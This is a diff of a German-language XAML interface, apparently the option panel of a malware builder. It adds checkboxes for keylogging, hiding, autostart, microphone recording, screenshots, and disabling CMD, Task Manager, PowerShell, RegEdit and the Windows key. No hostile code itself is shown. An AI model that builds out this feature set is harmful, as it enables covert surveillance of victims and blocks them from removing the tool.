@@ -314,7 +314,7 @@
                     <TextBlock VerticalAlignment="Center" HorizontalAlignment="Center" FontSize="14">Ändern...</TextBlock>
                 </Border>
             </Grid>
-            <Grid x:Name="baukastenGrid2" Grid.Column="1">
+            <Grid x:Name="baukastenGrid2" Grid.Column="1" Opacity="0" IsEnabled="False">
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition Width="20"/>
                     <ColumnDefinition Width="1*"/>
@@ -338,16 +338,71 @@
                     <RowDefinition Height="1*"/>
                     <RowDefinition Height="1*"/>
                 </Grid.RowDefinitions>
-                <CheckBox x:Name="keyloggerCheckbox" Grid.Row="1" Grid.Column="1" VerticalAlignment="Center">Keylogger</CheckBox>
+                <CheckBox x:Name="keyloggerCheckbox" Grid.Row="0" Grid.Column="1" VerticalAlignment="Center">Keylogger</CheckBox>
 
-                <CheckBox x:Name="hideCheckbox" Grid.Row="3" Grid.Column="1" VerticalAlignment="Center">Verstecken</CheckBox>
+                <CheckBox x:Name="hideCheckbox" Grid.Row="2" Grid.Column="1" VerticalAlignment="Center">Verstecken</CheckBox>
 
-                <CheckBox x:Name="autostartCheckbox" Grid.Row="5" Grid.Column="1" VerticalAlignment="Center">Autostart</CheckBox>
+                <CheckBox x:Name="autostartCheckbox" Grid.Row="4" Grid.Column="1" VerticalAlignment="Center">Autostart</CheckBox>
 
-                <CheckBox x:Name="microphoneCheckbox" Grid.Row="7" Grid.Column="1" VerticalAlignment="Center">Mikrofonaufnahme</CheckBox>
+                <CheckBox x:Name="microphoneCheckbox" Grid.Row="6" Grid.Column="1" VerticalAlignment="Center">Mikrofonaufnahme</CheckBox>
+
+                <CheckBox x:Name="screenshotCheckbox" Grid.Row="8" Grid.Column="1" VerticalAlignment="Center">Screenshots</CheckBox>
             </Grid>
-            <Grid x:Name="baukastenGrid3" Grid.Column="1">
-                
+            <Grid x:Name="baukastenGrid3" Grid.Column="1" Opacity="0" IsEnabled="False">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="20"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="20"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="20"/>
+                </Grid.ColumnDefinitions>
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                </Grid.RowDefinitions>
+                <CheckBox x:Name="cmdCheckbox" Grid.Row="0" Grid.Column="1" VerticalAlignment="Center">CMD deaktivieren</CheckBox>
+                <CheckBox x:Name="runCheckbox" Grid.Row="2" Grid.Column="1" Grid.ColumnSpan="2" VerticalAlignment="Center">Ausführen Dialog deaktivieren</CheckBox>
+                <CheckBox x:Name="taskmanagerCheckbox" Grid.Row="4" Grid.Column="1" Grid.ColumnSpan="2" VerticalAlignment="Center">Taskmanager deaktivieren</CheckBox>
+                <CheckBox x:Name="windowskeyCheckbox" Grid.Row="6" Grid.Column="1" Grid.ColumnSpan="2" VerticalAlignment="Center">Windows Taste deaktivieren</CheckBox>
+                <CheckBox x:Name="powershellCheckbox" Grid.Row="8" Grid.Column="1" Grid.ColumnSpan="2" VerticalAlignment="Center">Powershell deaktivieren</CheckBox>
+                <CheckBox x:Name="regeditCheckbox" Grid.Row="10" Grid.Column="1" VerticalAlignment="Center">RegEdit deaktivieren</CheckBox>
+            </Grid>
+            <Grid x:Name="baukastenGrid4" Grid.Column="1">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="20"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="20"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="1*"/>
+                    <ColumnDefinition Width="20"/>
+                </Grid.ColumnDefinitions>
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="1*"/>
+                </Grid.RowDefinitions>
             </Grid>
         </Grid>
         <Grid Grid.Row="1" x:Name="removerGrid">
